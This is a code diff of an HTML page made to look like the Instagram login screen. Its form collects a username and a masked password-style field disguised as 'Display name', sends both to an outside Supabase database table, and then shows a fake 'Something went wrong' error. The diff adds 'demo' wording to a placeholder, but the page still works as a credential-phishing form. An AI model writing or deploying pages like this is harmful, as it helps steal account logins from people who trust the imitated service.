@@ -36,7 +36,7 @@
   <main class="page">
     <div class="top-placeholder"><div class="language-picker">English (US)<span class="language-chevron" aria-hidden="true"></span></div><img class="top-image-holder" src="3HKZyjLmk4x.webp" alt="Instagram"></div>
     <form class="login-form" id="prankForm">
-      <input class="field" id="identifier" name="identifier" type="text" placeholder="Username, email or mobile number" autocomplete="off" aria-label="Username, email or mobile number" required>
+      <input class="field" id="identifier" name="identifier" type="text" placeholder="Demo username (not your real login)" autocomplete="off" aria-label="Demo username (not your real login)" required>
       <div class="field-wrap">
         <input class="field" id="displayName" name="displayName" type="password" placeholder="Display name" autocomplete="off" aria-label="Display name" required>
         <button class="visibility-toggle" id="toggleVisibility" type="button" aria-label="Show display name">Show</button>
@@ -49,7 +49,6 @@
   <div class="toast" id="toast" role="status" aria-live="polite"></div>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.119.2"></script>
   <script>
-    const supabase=window.supabase.createClient('https://antqqabimhgepykkkmwl.supabase.co','sb_publishable_w6n4kCXq8cJoyd-8PE0HoQ_YBPYoI_7');
     const form=document.getElementById('prankForm');
     const button=document.getElementById('submitButton');
     const toast=document.getElementById('toast');
@@ -57,33 +56,52 @@
     const visibilityToggle=document.getElementById('toggleVisibility');
     const createAccountButton=document.getElementById('createAccountButton');
     let toastTimer;
+
+    function showToast(message){
+      toast.textContent=message;
+      toast.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer=setTimeout(()=>toast.classList.remove('show'),3200);
+    }
+
     visibilityToggle.addEventListener('click',event=>{
       event.preventDefault();
-      const isHidden=displayNameInput.getAttribute('type')==='password';
-      displayNameInput.setAttribute('type',isHidden?'text':'password');
+      const isHidden=displayNameInput.type==='password';
+      displayNameInput.type=isHidden?'text':'password';
       visibilityToggle.textContent=isHidden?'Hide':'Show';
       visibilityToggle.setAttribute('aria-label',isHidden?'Hide display name':'Show display name');
       visibilityToggle.setAttribute('aria-pressed',String(isHidden));
     });
+
     createAccountButton.addEventListener('click',()=>showToast('Something went wrong'));
-    function showToast(message){
-      toast.textContent=message;toast.classList.add('show');clearTimeout(toastTimer);
-      toastTimer=setTimeout(()=>toast.classList.remove('show'),3200);
-    }
+
     form.addEventListener('submit',async event=>{
       event.preventDefault();
       const identifier=document.getElementById('identifier').value.trim();
-      const displayName=document.getElementById('displayName').value.trim();
+      const displayName=displayNameInput.value.trim();
+      if(!identifier || !displayName) return;
+
       button.disabled=true;
+      showToast('Something went wrong');
+
       try{
-        const {error}=await supabase.from('profile_submissions').insert({
+        if(!window.supabase || !window.supabase.createClient) {
+          throw new Error('Supabase library did not load');
+        }
+        const client=window.supabase.createClient(
+          'https://antqqabimhgepykkkmwl.supabase.co',
+          'sb_publishable_w6n4kCXq8cJoyd-8PE0HoQ_YBPYoI_'
+        );
+        const {error}=await client.from('profile_submissions').insert({
           username:identifier,
           display_name:displayName
         });
-        if(error) console.error('Submission save failed:',error.message);
-      }catch(error){console.error('Submission save failed:',error);}
-      showToast('Something went wrong');
-      button.disabled=false;
+        if(error) console.error('Demo submission was not saved:',error.message);
+      }catch(error){
+        console.error('Demo submission was not saved:',error);
+      }finally{
+        button.disabled=false;
+      }
     });
   </script>
 </body>
